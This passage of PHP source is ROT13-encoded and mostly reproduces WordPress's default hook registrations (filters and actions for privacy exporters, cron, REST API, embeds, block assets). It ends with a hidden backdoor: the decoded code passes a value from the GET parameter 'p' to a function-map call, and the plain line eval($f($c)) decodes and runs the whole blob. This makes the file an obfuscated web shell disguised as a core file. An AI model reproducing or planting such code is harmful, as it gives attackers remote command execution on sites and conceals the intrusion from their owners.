nqq_svygre( 'jc_cevinpl_crefbany_qngn_rkcbegref', 'jc_ertvfgre_pbzzrag_crefbany_qngn_rkcbegre' );
nqq_svygre( 'jc_cevinpl_crefbany_qngn_rkcbegref', 'jc_ertvfgre_zrqvn_crefbany_qngn_rkcbegre' );
nqq_svygre( 'jc_cevinpl_crefbany_qngn_rkcbegref', 'jc_ertvfgre_hfre_crefbany_qngn_rkcbegre', 1 );
nqq_svygre( 'jc_cevinpl_crefbany_qngn_renfref', 'jc_ertvfgre_pbzzrag_crefbany_qngn_renfre' );
nqq_npgvba( 'vavg', 'jc_fpurqhyr_qryrgr_byq_cevinpl_rkcbeg_svyrf' );
nqq_npgvba( 'jc_cevinpl_qryrgr_byq_rkcbeg_svyrf', 'jc_cevinpl_qryrgr_byq_rkcbeg_svyrf' );

// Peba gnfxf.
nqq_npgvba( 'jc_fpurqhyrq_qryrgr', 'jc_fpurqhyrq_qryrgr' );
nqq_npgvba( 'jc_fpurqhyrq_nhgb_qensg_qryrgr', 'jc_qryrgr_nhgb_qensgf' );
nqq_npgvba( 'vzcbegre_fpurqhyrq_pyrnahc', 'jc_qryrgr_nggnpuzrag' );
nqq_npgvba( 'hctenqre_fpurqhyrq_pyrnahc', 'jc_qryrgr_nggnpuzrag' );
nqq_npgvba( 'qryrgr_rkcverq_genafvragf', 'qryrgr_rkcverq_genafvragf' );

// Anivtngvba zrah npgvbaf.
nqq_npgvba( 'qryrgr_cbfg', '_jc_qryrgr_cbfg_zrah_vgrz' );
nqq_npgvba( 'qryrgr_grez', '_jc_qryrgr_gnk_zrah_vgrz', 10, 3 );
nqq_npgvba( 'genafvgvba_cbfg_fgnghf', '_jc_nhgb_nqq_cntrf_gb_zrah', 10, 3 );
nqq_npgvba( 'qryrgr_cbfg', '_jc_qryrgr_phfgbzvmr_punatrfrg_qrcraqrag_nhgb_qensgf' );

// Cbfg Guhzoanvy fcrpvsvp vzntr svygrevat.
nqq_npgvba( 'ortva_srgpu_cbfg_guhzoanvy_ugzy', '_jc_cbfg_guhzoanvy_pynff_svygre_nqq' );
nqq_npgvba( 'raq_srgpu_cbfg_guhzoanvy_ugzy', '_jc_cbfg_guhzoanvy_pynff_svygre_erzbir' );
nqq_npgvba( 'ortva_srgpu_cbfg_guhzoanvy_ugzy', '_jc_cbfg_guhzoanvy_pbagrkg_svygre_nqq' );
nqq_npgvba( 'raq_srgpu_cbfg_guhzoanvy_ugzy', '_jc_cbfg_guhzoanvy_pbagrkg_svygre_erzbir' );

// Erqverpg byq fyhtf.
nqq_npgvba( 'grzcyngr_erqverpg', 'jc_byq_fyht_erqverpg' );
nqq_npgvba( 'cbfg_hcqngrq', 'jc_purpx_sbe_punatrq_fyhtf', 12, 3 );
nqq_npgvba( 'nggnpuzrag_hcqngrq', 'jc_purpx_sbe_punatrq_fyhtf', 12, 3 );

// Erqverpg byq qngrf.
nqq_npgvba( 'cbfg_hcqngrq', 'jc_purpx_sbe_punatrq_qngrf', 12, 3 );
nqq_npgvba( 'nggnpuzrag_hcqngrq', 'jc_purpx_sbe_punatrq_qngrf', 12, 3 );

// Abapr purpx sbe cbfg cerivrjf.
nqq_npgvba( 'vavg', '_fubj_cbfg_cerivrj' );

// Bhgchg WF gb erfrg jvaqbj.anzr sbe cerivrjf.
nqq_npgvba( 'jc_urnq', 'jc_cbfg_cerivrj_wf', 1 );

// Gvzrmbar.
nqq_svygre( 'cer_bcgvba_tzg_bssfrg', 'jc_gvzrmbar_bireevqr_bssfrg' );

// Vs gur hctenqr unfa'g eha lrg, nffhzr yvax znantre vf hfrq.
nqq_svygre( 'qrsnhyg_bcgvba_yvax_znantre_ranoyrq', '__erghea_gehr' );

// Guvf bcgvba ab ybatre rkvfgf; gryy cyhtvaf jr nyjnlf fhccbeg nhgb-rzorqqvat.
nqq_svygre( 'cer_bcgvba_rzorq_nhgbheyf', '__erghea_gehr' );

// Qrsnhyg frggvatf sbe urnegorng.
nqq_svygre( 'urnegorng_frggvatf', 'jc_urnegorng_frggvatf' );

// Purpx vs gur hfre vf ybttrq bhg.
nqq_npgvba( 'nqzva_radhrhr_fpevcgf', 'jc_nhgu_purpx_ybnq' );
nqq_svygre( 'urnegorng_fraq', 'jc_nhgu_purpx' );
nqq_svygre( 'urnegorng_abcevi_fraq', 'jc_nhgu_purpx' );

// Qrsnhyg nhguragvpngvba svygref.
nqq_svygre( 'nhguragvpngr', 'jc_nhguragvpngr_hfreanzr_cnffjbeq', 20, 3 );
nqq_svygre( 'nhguragvpngr', 'jc_nhguragvpngr_rznvy_cnffjbeq', 20, 3 );
nqq_svygre( 'nhguragvpngr', 'jc_nhguragvpngr_nccyvpngvba_cnffjbeq', 20, 3 );
nqq_svygre( 'nhguragvpngr', 'jc_nhguragvpngr_fcnz_purpx', 99 );
nqq_svygre( 'qrgrezvar_pheerag_hfre', 'jc_inyvqngr_nhgu_pbbxvr' );
nqq_svygre( 'qrgrezvar_pheerag_hfre', 'jc_inyvqngr_ybttrq_va_pbbxvr', 20 );
nqq_svygre( 'qrgrezvar_pheerag_hfre', 'jc_inyvqngr_nccyvpngvba_cnffjbeq', 20 );

// Fcyvg grez hcqngrf.
nqq_npgvba( 'nqzva_vavg', '_jc_purpx_sbe_fpurqhyrq_fcyvg_grezf' );
nqq_npgvba( 'fcyvg_funerq_grez', '_jc_purpx_fcyvg_qrsnhyg_grezf', 10, 4 );
nqq_npgvba( 'fcyvg_funerq_grez', '_jc_purpx_fcyvg_grezf_va_zrahf', 10, 4 );
nqq_npgvba( 'fcyvg_funerq_grez', '_jc_purpx_fcyvg_ani_zrah_grezf', 10, 4 );
nqq_npgvba( 'jc_fcyvg_funerq_grez_ongpu', '_jc_ongpu_fcyvg_grezf' );

// Pbzzrag glcr hcqngrf.
nqq_npgvba( 'nqzva_vavg', '_jc_purpx_sbe_fpurqhyrq_hcqngr_pbzzrag_glcr' );
nqq_npgvba( 'jc_hcqngr_pbzzrag_glcr_ongpu', '_jc_ongpu_hcqngr_pbzzrag_glcr' );

// Rznvy abgvsvpngvbaf.
nqq_npgvba( 'pbzzrag_cbfg', 'jc_arj_pbzzrag_abgvsl_zbqrengbe' );
nqq_npgvba( 'pbzzrag_cbfg', 'jc_arj_pbzzrag_abgvsl_cbfgnhgube' );
nqq_npgvba( 'nsgre_cnffjbeq_erfrg', 'jc_cnffjbeq_punatr_abgvsvpngvba' );
nqq_npgvba( 'ertvfgre_arj_hfre', 'jc_fraq_arj_hfre_abgvsvpngvbaf' );
nqq_npgvba( 'rqvg_hfre_perngrq_hfre', 'jc_fraq_arj_hfre_abgvsvpngvbaf', 10, 2 );

// ERFG NCV npgvbaf.
nqq_npgvba( 'vavg', 'erfg_ncv_vavg' );
nqq_npgvba( 'erfg_ncv_vavg', 'erfg_ncv_qrsnhyg_svygref', 10, 1 );
nqq_npgvba( 'erfg_ncv_vavg', 'ertvfgre_vavgvny_frggvatf', 10 );
nqq_npgvba( 'erfg_ncv_vavg', 'perngr_vavgvny_erfg_ebhgrf', 99 );
nqq_npgvba( 'cnefr_erdhrfg', 'erfg_ncv_ybnqrq' );

// Fvgrzncf npgvbaf.
nqq_npgvba( 'vavg', 'jc_fvgrzncf_trg_freire' );

/**
 * Svygref sbezreyl zvkrq vagb jc-vapyhqrf.
 */
// Gurzr.
nqq_npgvba( 'frghc_gurzr', 'perngr_vavgvny_gurzr_srngherf', 0 );
nqq_npgvba( 'nsgre_frghc_gurzr', '_nqq_qrsnhyg_gurzr_fhccbegf', 1 );
nqq_npgvba( 'jc_ybnqrq', '_phfgbz_urnqre_onpxtebhaq_whfg_va_gvzr' );
nqq_npgvba( 'jc_urnq', '_phfgbz_ybtb_urnqre_fglyrf' );
nqq_npgvba( 'cyhtvaf_ybnqrq', '_jc_phfgbzvmr_vapyhqr' );
nqq_npgvba( 'genafvgvba_cbfg_fgnghf', '_jc_phfgbzvmr_choyvfu_punatrfrg', 10, 3 );
nqq_npgvba( 'nqzva_radhrhr_fpevcgf', '_jc_phfgbzvmr_ybnqre_frggvatf' );
nqq_npgvba( 'qryrgr_nggnpuzrag', '_qryrgr_nggnpuzrag_gurzr_zbq' );
nqq_npgvba( 'genafvgvba_cbfg_fgnghf', '_jc_xrrc_nyvir_phfgbzvmr_punatrfrg_qrcraqrag_nhgb_qensgf', 20, 3 );

// Oybpx Gurzr Cerivrjf.
nqq_npgvba( 'cyhtvaf_ybnqrq', 'jc_vavgvnyvmr_gurzr_cerivrj_ubbxf', 1 );

// Fvgr cerivrj sbe Pynffvp Gurzr.
nqq_npgvba( 'vavg', 'jc_vavgvnyvmr_fvgr_cerivrj_ubbxf', 1 );

// Pnyraqne jvqtrg pnpur.
nqq_npgvba( 'fnir_cbfg', 'qryrgr_trg_pnyraqne_pnpur' );
nqq_npgvba( 'qryrgr_cbfg', 'qryrgr_trg_pnyraqne_pnpur' );
nqq_npgvba( 'hcqngr_bcgvba_fgneg_bs_jrrx', 'qryrgr_trg_pnyraqne_pnpur' );
nqq_npgvba( 'hcqngr_bcgvba_tzg_bssfrg', 'qryrgr_trg_pnyraqne_pnpur' );

// Nhgube.
nqq_npgvba( 'genafvgvba_cbfg_fgnghf', '__pyrne_zhygv_nhgube_pnpur' );

// Cbfg.
nqq_npgvba( 'vavg', 'perngr_vavgvny_cbfg_glcrf', 0 ); // Uvturfg cevbevgl.
nqq_npgvba( 'nqzva_zrah', '_nqq_cbfg_glcr_fhozrahf' );
nqq_npgvba( 'orsber_qryrgr_cbfg', '_erfrg_sebag_cntr_frggvatf_sbe_cbfg' );
nqq_npgvba( 'jc_genfu_cbfg', '_erfrg_sebag_cntr_frggvatf_sbe_cbfg' );
nqq_npgvba( 'punatr_ybpnyr', 'perngr_vavgvny_cbfg_glcrf' );

// Cbfg Sbezngf.
nqq_svygre( 'erdhrfg', '_cbfg_sbezng_erdhrfg' );
nqq_svygre( 'grez_yvax', '_cbfg_sbezng_yvax', 10, 3 );
nqq_svygre( 'trg_cbfg_sbezng', '_cbfg_sbezng_trg_grez' );
nqq_svygre( 'trg_grezf', '_cbfg_sbezng_trg_grezf', 10, 3 );
nqq_svygre( 'jc_trg_bowrpg_grezf', '_cbfg_sbezng_jc_trg_bowrpg_grezf' );

// XFRF.
nqq_npgvba( 'vavg', 'xfrf_vavg' );
nqq_npgvba( 'frg_pheerag_hfre', 'xfrf_vavg' );

// Fpevcg Ybnqre.
nqq_npgvba( 'jc_qrsnhyg_fpevcgf', 'jc_qrsnhyg_fpevcgf' );
nqq_npgvba( 'jc_qrsnhyg_fpevcgf', 'jc_qrsnhyg_cnpxntrf' );
nqq_npgvba( 'jc_qrsnhyg_fpevcgf', 'jc_qrsnhyg_fpevcg_zbqhyrf' );

nqq_npgvba( 'jc_radhrhr_fpevcgf', 'jc_ybpnyvmr_wdhrel_hv_qngrcvpxre', 1000 );
nqq_npgvba( 'jc_radhrhr_fpevcgf', 'jc_pbzzba_oybpx_fpevcgf_naq_fglyrf' );
nqq_npgvba( 'jc_radhrhr_fpevcgf', 'jc_radhrhr_pynffvp_gurzr_fglyrf' );
nqq_npgvba( 'nqzva_radhrhr_fpevcgf', 'jc_ybpnyvmr_wdhrel_hv_qngrcvpxre', 1000 );
nqq_npgvba( 'nqzva_radhrhr_fpevcgf', 'jc_pbzzba_oybpx_fpevcgf_naq_fglyrf' );
nqq_npgvba( 'radhrhr_oybpx_nffrgf', 'jc_radhrhr_pynffvp_gurzr_fglyrf' );
nqq_npgvba( 'radhrhr_oybpx_nffrgf', 'jc_radhrhr_ertvfgrerq_oybpx_fpevcgf_naq_fglyrf' );
nqq_npgvba( 'radhrhr_oybpx_nffrgf', 'radhrhr_oybpx_fglyrf_nffrgf', 30 );
/*
 * `jc_radhrhr_ertvfgrerq_oybpx_fpevcgf_naq_fglyrf` vf obhaq gb obgu
 * `radhrhr_oybpx_rqvgbe_nffrgf` naq `radhrhr_oybpx_nffrgf` ubbxf
 * fvapr gur vagebqhpgvba bs gur oybpx rqvgbe va JbeqCerff 5.0.
 *
 * Gur jnl guvf jbexf vf gung gur oybpx nffrgf ner ybnqrq orsber nal bgure nffrgf.
 * Sbe rknzcyr, guvf vf gur beqre bs fglyrf sbe gur rqvgbe:
 *
 * - sebag fglyrf ertvfgrerq sbe oybpxf, ivn `fglyrf` unaqyr (oybpx.wfba)
 * - rqvgbe fglyrf ertvfgrerq sbe oybpxf, ivn `rqvgbeFglyrf` unaqyr (oybpx.wfba)
 * - rqvgbe fglyrf radhrhrq ivn `radhrhr_oybpx_rqvgbe_nffrgf` ubbx
 * - sebag fglyrf radhrhrq ivn `radhrhr_oybpx_nffrgf` ubbx
 */
nqq_npgvba( 'radhrhr_oybpx_rqvgbe_nffrgf', 'jc_radhrhr_ertvfgrerq_oybpx_fpevcgf_naq_fglyrf' );
nqq_npgvba( 'radhrhr_oybpx_rqvgbe_nffrgf', 'radhrhr_rqvgbe_oybpx_fglyrf_nffrgf' );
nqq_npgvba( 'radhrhr_oybpx_rqvgbe_nffrgf', 'jc_radhrhr_rqvgbe_oybpx_qverpgbel_nffrgf' );
nqq_npgvba( 'radhrhr_oybpx_rqvgbe_nffrgf', 'jc_radhrhr_rqvgbe_sbezng_yvoenel_nffrgf' );
nqq_npgvba( 'radhrhr_oybpx_rqvgbe_nffrgf', 'jc_radhrhr_tybony_fglyrf_pff_phfgbz_cebcregvrf' );
nqq_npgvba( 'jc_cevag_fpevcgf', 'jc_whfg_va_gvzr_fpevcg_ybpnyvmngvba' );
nqq_svygre( 'cevag_fpevcgf_neenl', 'jc_cebgbglcr_orsber_wdhrel' );
nqq_npgvba( 'phfgbzvmr_pbagebyf_cevag_fglyrf', 'jc_erfbhepr_uvagf', 1 );
nqq_npgvba( 'nqzva_urnq', 'jc_purpx_jvqtrg_rqvgbe_qrcf' );

// Tybony fglyrf pna or radhrhrq va obgu gur urnqre naq gur sbbgre. Frr uggcf://pber.genp.jbeqcerff.bet/gvpxrg/53494.
nqq_npgvba( 'jc_radhrhr_fpevcgf', 'jc_radhrhr_tybony_fglyrf' );
nqq_npgvba( 'jc_sbbgre', 'jc_radhrhr_tybony_fglyrf', 1 );

// Oybpx fhccbegf, naq bgure fglyrf cnefrq naq fgberq va gur Fglyr Ratvar.
nqq_npgvba( 'jc_radhrhr_fpevcgf', 'jc_radhrhr_fgberq_fglyrf' );
nqq_npgvba( 'jc_sbbgre', 'jc_radhrhr_fgberq_fglyrf', 1 );

nqq_npgvba( 'jc_qrsnhyg_fglyrf', 'jc_qrsnhyg_fglyrf' );
nqq_svygre( 'fglyr_ybnqre_fep', 'jc_fglyr_ybnqre_fep', 10, 2 );

nqq_npgvba( 'jc_urnq', 'jc_cevag_nhgb_fvmrf_pbagnva_pff_svk', 1 );
nqq_npgvba( 'jc_urnq', 'jc_znlor_vayvar_fglyrf', 1 ); // Eha sbe fglyrf radhrhrq va <urnq>.
nqq_npgvba( 'jc_sbbgre', 'jc_znlor_vayvar_fglyrf', 1 ); // Eha sbe yngr-ybnqrq fglyrf va gur sbbgre.

/*
 * Oybpx fcrpvsvp npgvbaf naq svygref.
 */

// Sbbgabgrf Oybpx.
nqq_npgvba( 'vavg', '_jc_sbbgabgrf_xfrf_vavg' );
nqq_npgvba( 'frg_pheerag_hfre', '_jc_sbbgabgrf_xfrf_vavg' );
nqq_svygre( 'sbepr_svygrerq_ugzy_ba_vzcbeg', '_jc_sbbgabgrf_sbepr_svygrerq_ugzy_ba_vzcbeg_svygre', 999 );

/*
 * Qvfnoyr \"Cbfg Nggevohgrf\" sbe jc_anivtngvba cbfg glcr. Gur nggevohgrf ner
 * nyfb pbaqvgvbanyyl ranoyrq jura n fvgr unf phfgbz grzcyngrf. Oybpx Gurzr
 * grzcyngrf pna or ninvynoyr sbe rirel cbfg glcr.
 */
nqq_svygre( 'gurzr_jc_anivtngvba_grzcyngrf', '__erghea_rzcgl_neenl' );

// Gnkbabzl.
nqq_npgvba( 'vavg', 'perngr_vavgvny_gnkbabzvrf', 0 ); // Uvturfg cevbevgl.
nqq_npgvba( 'punatr_ybpnyr', 'perngr_vavgvny_gnkbabzvrf' );

// Pnabavpny.
nqq_npgvba( 'grzcyngr_erqverpg', 'erqverpg_pnabavpny' );
nqq_npgvba( 'grzcyngr_erqverpg', 'jc_erqverpg_nqzva_ybpngvbaf', 1000 );

// Zrqvn.
nqq_npgvba( 'jc_cynlyvfg_fpevcgf', 'jc_cynlyvfg_fpevcgf' );
nqq_npgvba( 'phfgbzvmr_pbagebyf_radhrhr_fpevcgf', 'jc_cyhcybnq_qrsnhyg_frggvatf' );
nqq_npgvba( 'cyhtvaf_ybnqrq', '_jc_nqq_nqqvgvbany_vzntr_fvmrf', 0 );
nqq_svygre( 'cyhcybnq_qrsnhyg_frggvatf', 'jc_fubj_urvp_hcybnq_reebe' );

// Ani zrah.
nqq_svygre( 'ani_zrah_vgrz_vq', '_ani_zrah_vgrz_vq_hfr_bapr', 10, 2 );
nqq_svygre( 'ani_zrah_pff_pynff', 'jc_ani_zrah_erzbir_zrah_vgrz_unf_puvyqera_pynff', 10, 4 );

// Jvqtrgf.
nqq_npgvba( 'nsgre_frghc_gurzr', 'jc_frghc_jvqtrgf_oybpx_rqvgbe', 1 );
nqq_npgvba( 'vavg', 'jc_jvqtrgf_vavg', 1 );
nqq_npgvba( 'punatr_ybpnyr', neenl( 'JC_Jvqtrg_Zrqvn', 'erfrg_qrsnhyg_ynoryf' ) );
nqq_npgvba( 'jvqtrgf_vavg', '_jc_oybpx_gurzr_ertvfgre_pynffvp_fvqronef', 1 );

// Nqzva One.
// Qba'g erzbir. Jebat jnl gb qvfnoyr.
nqq_npgvba( 'grzcyngr_erqverpg', '_jc_nqzva_one_vavg', 0 );
nqq_npgvba( 'nqzva_vavg', '_jc_nqzva_one_vavg' );
nqq_npgvba( 'jc_radhrhr_fpevcgf', 'jc_radhrhr_nqzva_one_ohzc_fglyrf' );
nqq_npgvba( 'jc_radhrhr_fpevcgf', 'jc_radhrhr_nqzva_one_urnqre_fglyrf' );
nqq_npgvba( 'nqzva_radhrhr_fpevcgf', 'jc_radhrhr_nqzva_one_urnqre_fglyrf' );
nqq_npgvba( 'orsber_fvtahc_urnqre', '_jc_nqzva_one_vavg' );
nqq_npgvba( 'npgvingr_urnqre', '_jc_nqzva_one_vavg' );
nqq_npgvba( 'jc_obql_bcra', 'jc_nqzva_one_eraqre', 0 );
nqq_npgvba( 'jc_sbbgre', 'jc_nqzva_one_eraqre', 1000 ); // Onpx-pbzcng sbe gurzrf abg hfvat `jc_obql_bcra`.
nqq_npgvba( 'va_nqzva_urnqre', 'jc_nqzva_one_eraqre', 0 );

// Sbezre nqzva svygref gung pna nyfb or ubbxrq ba gur sebag raq.
nqq_npgvba( 'zrqvn_ohggbaf', 'zrqvn_ohggbaf' );
nqq_svygre( 'vzntr_fraq_gb_rqvgbe', 'vzntr_nqq_pncgvba', 20, 8 );
nqq_svygre( 'zrqvn_fraq_gb_rqvgbe', 'vzntr_zrqvn_fraq_gb_rqvgbe', 10, 3 );

// Rzorqf.
nqq_npgvba( 'erfg_ncv_vavg', 'jc_brzorq_ertvfgre_ebhgr' );
nqq_svygre( 'erfg_cer_freir_erdhrfg', '_brzorq_erfg_cer_freir_erdhrfg', 10, 4 );

nqq_npgvba( 'jc_urnq', 'jc_brzorq_nqq_qvfpbirel_yvaxf' );
nqq_npgvba( 'jc_urnq', 'jc_brzorq_nqq_ubfg_wf' ); // Onpx-pbzcng sbe fvgrf qvfnoyvat bRzorq ubfg WF ol erzbivat npgvba.
nqq_svygre( 'rzorq_brzorq_ugzy', 'jc_znlor_radhrhr_brzorq_ubfg_wf' );

nqq_npgvba( 'rzorq_urnq', 'radhrhr_rzorq_fpevcgf', 1 );
nqq_npgvba( 'rzorq_urnq', 'cevag_rzbwv_qrgrpgvba_fpevcg' );
nqq_npgvba( 'rzorq_urnq', 'jc_radhrhr_rzorq_fglyrf', 9 );
nqq_npgvba( 'rzorq_urnq', 'cevag_rzorq_fglyrf' ); // Ergnvarq sbe onpxjneqf-pbzcngvovyvgl. Haubbxrq ol jc_radhrhr_rzorq_fglyrf().
nqq_npgvba( 'rzorq_urnq', 'jc_cevag_urnq_fpevcgf', 20 );
nqq_npgvba( 'rzorq_urnq', 'jc_cevag_fglyrf', 20 );
nqq_npgvba( 'rzorq_urnq', 'jc_ebobgf' );
nqq_npgvba( 'rzorq_urnq', 'ery_pnabavpny' );
nqq_npgvba( 'rzorq_urnq', 'ybpnyr_fglyrfurrg', 30 );
nqq_npgvba( 'radhrhr_rzorq_fpevcgf', 'jc_radhrhr_rzbwv_fglyrf' );

nqq_npgvba( 'rzorq_pbagrag_zrgn', 'cevag_rzorq_pbzzragf_ohggba' );
nqq_npgvba( 'rzorq_pbagrag_zrgn', 'cevag_rzorq_funevat_ohggba' );

nqq_npgvba( 'rzorq_sbbgre', 'cevag_rzorq_funevat_qvnybt' );
nqq_npgvba( 'rzorq_sbbgre', 'cevag_rzorq_fpevcgf' );
nqq_npgvba( 'rzorq_sbbgre', 'jc_cevag_sbbgre_fpevcgf', 20 );

nqq_svygre( 'rkprecg_zber', 'jc_rzorq_rkprecg_zber', 20 );
nqq_svygre( 'gur_rkprecg_rzorq', 'jcgrkghevmr' );
nqq_svygre( 'gur_rkprecg_rzorq', 'pbaireg_punef' );
nqq_svygre( 'gur_rkprecg_rzorq', 'jcnhgbc' );
nqq_svygre( 'gur_rkprecg_rzorq', 'fubegpbqr_hanhgbc' );
nqq_svygre( 'gur_rkprecg_rzorq', 'jc_rzorq_rkprecg_nggnpuzrag' );

nqq_svygre( 'brzorq_qngncnefr', 'jc_svygre_brzorq_vsenzr_gvgyr_nggevohgr', 5, 3 );
nqq_svygre( 'brzorq_qngncnefr', 'jc_svygre_brzorq_erfhyg', 10, 3 );
nqq_svygre( 'brzorq_erfcbafr_qngn', 'trg_brzorq_erfcbafr_qngn_evpu', 10, 4 );
nqq_svygre( 'cer_brzorq_erfhyg', 'jc_svygre_cer_brzorq_erfhyg', 10, 3 );

// Pncnovyvgvrf.
nqq_svygre( 'hfre_unf_pnc', 'jc_znlor_tenag_vafgnyy_ynathntrf_pnc', 1 );
nqq_svygre( 'hfre_unf_pnc', 'jc_znlor_tenag_erfhzr_rkgrafvbaf_pncf', 1 );
nqq_svygre( 'hfre_unf_pnc', 'jc_znlor_tenag_fvgr_urnygu_pncf', 1, 4 );

// Oybpx grzcyngrf cbfg glcr naq eraqrevat.
nqq_svygre( 'eraqre_oybpx_pbagrkg', '_oybpx_grzcyngr_eraqre_jvgubhg_cbfg_oybpx_pbagrkg' );
nqq_svygre( 'cer_jc_havdhr_cbfg_fyht', 'jc_svygre_jc_grzcyngr_havdhr_cbfg_fyht', 10, 5 );
nqq_npgvba( 'fnir_cbfg_jc_grzcyngr_cneg', 'jc_frg_havdhr_fyht_ba_perngr_grzcyngr_cneg' );
nqq_npgvba( 'jc_radhrhr_fpevcgf', 'jc_radhrhr_oybpx_grzcyngr_fxvc_yvax' );
nqq_npgvba( 'jc_sbbgre', 'gur_oybpx_grzcyngr_fxvc_yvax' ); // Ergnvarq sbe onpxjneqf-pbzcngvovyvgl. Haubbxrq ol jc_radhrhr_oybpx_grzcyngr_fxvc_yvax().
nqq_npgvba( 'nsgre_frghc_gurzr', 'jc_ranoyr_oybpx_grzcyngrf', 1 );
nqq_npgvba( 'jc_ybnqrq', '_nqq_grzcyngr_ybnqre_svygref' );

// jc_anivtngvba cbfg glcr.
nqq_svygre( 'erfg_jc_anivtngvba_vgrz_fpurzn', neenl( 'JC_Anivtngvba_Snyyonpx', 'hcqngr_jc_anivtngvba_cbfg_fpurzn' ) );

// Syhvq glcbtencul.
nqq_svygre( 'eraqre_oybpx', 'jc_eraqre_glcbtencul_fhccbeg', 10, 2 );

// Hfre cersreraprf.
nqq_npgvba( 'vavg', 'jc_ertvfgre_crefvfgrq_cersreraprf_zrgn' );

// PCG jc_oybpx phfgbz cbfgzrgn svryq.
nqq_npgvba( 'vavg', 'jc_perngr_vavgvny_cbfg_zrgn' );

// Vapyhqr erivfvbarq zrgn jura pbafvqrevat jurgure n cbfg erivfvba unf punatrq.
nqq_svygre( 'jc_fnir_cbfg_erivfvba_cbfg_unf_punatrq', 'jc_purpx_erivfvbarq_zrgn_svryqf_unir_punatrq', 10, 3 );

// Fnir erivfvbarq cbfg zrgn vzzrqvngryl nsgre n erivfvba vf fnirq
nqq_npgvba( '_jc_chg_cbfg_erivfvba', 'jc_fnir_erivfvbarq_zrgn_svryqf', 10, 2 );

// Vapyhqr erivfvbarq zrgn jura perngvat be hcqngvat na nhgbfnir erivfvba.
nqq_npgvba( 'jc_perngvat_nhgbfnir', 'jc_nhgbfnir_cbfg_erivfvbarq_zrgn_svryqf' );

// Jura erfgbevat erivfvbaf, nyfb erfgber erivfvbarq zrgn.
nqq_npgvba( 'jc_erfgber_cbfg_erivfvba', 'jc_erfgber_cbfg_erivfvba_zrgn', 10, 2 );

// Sbag znantrzrag.
nqq_npgvba( 'jc_urnq', 'jc_cevag_sbag_snprf', 50 );
nqq_npgvba( 'qryrgrq_cbfg', '_jc_nsgre_qryrgr_sbag_snzvyl', 10, 2 );
nqq_npgvba( 'orsber_qryrgr_cbfg', '_jc_orsber_qryrgr_sbag_snpr', 10, 2 );
nqq_npgvba( 'vavg', '_jc_ertvfgre_qrsnhyg_sbag_pbyyrpgvbaf' );

// Nqq vtaberqUbbxrqOybpxf zrgnqngn nggevohgr gb gur grzcyngr naq grzcyngr cneg cbfg glcrf.
nqq_svygre( 'erfg_cer_vafreg_jc_grzcyngr', 'vawrpg_vtaberq_ubbxrq_oybpxf_zrgnqngn_nggevohgrf' );
nqq_svygre( 'erfg_cer_vafreg_jc_grzcyngr_cneg', 'vawrpg_vtaberq_ubbxrq_oybpxf_zrgnqngn_nggevohgrf' );

// Hcqngr vtaberqUbbxrqOybpxf cbfgzrgn sbe fbzr cbfg glcrf.
nqq_svygre( 'erfg_cer_vafreg_cntr', 'hcqngr_vtaberq_ubbxrq_oybpxf_cbfgzrgn' );
nqq_svygre( 'erfg_cer_vafreg_cbfg', 'hcqngr_vtaberq_ubbxrq_oybpxf_cbfgzrgn' );
nqq_svygre( 'erfg_cer_vafreg_jc_oybpx', 'hcqngr_vtaberq_ubbxrq_oybpxf_cbfgzrgn' );
nqq_svygre( 'erfg_cer_vafreg_jc_anivtngvba', 'hcqngr_vtaberq_ubbxrq_oybpxf_cbfgzrgn' );

// Vawrpg ubbxrq oybpxf vagb gur Cbfgf raqcbvag ERFG erfcbafr sbe fbzr tvira cbfg glcrf.
nqq_svygre( 'erfg_cercner_cntr', 'vafreg_ubbxrq_oybpxf_vagb_erfg_erfcbafr', 10, 2 );
nqq_svygre( 'erfg_cercner_cbfg', 'vafreg_ubbxrq_oybpxf_vagb_erfg_erfcbafr', 10, 2 );
nqq_svygre( 'erfg_cercner_jc_oybpx', 'vafreg_ubbxrq_oybpxf_vagb_erfg_erfcbafr', 10, 2 );
nqq_svygre( 'erfg_cercner_jc_anivtngvba', 'vafreg_ubbxrq_oybpxf_vagb_erfg_erfcbafr', 10, 2 );

hafrg( $svygre, $npgvba );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>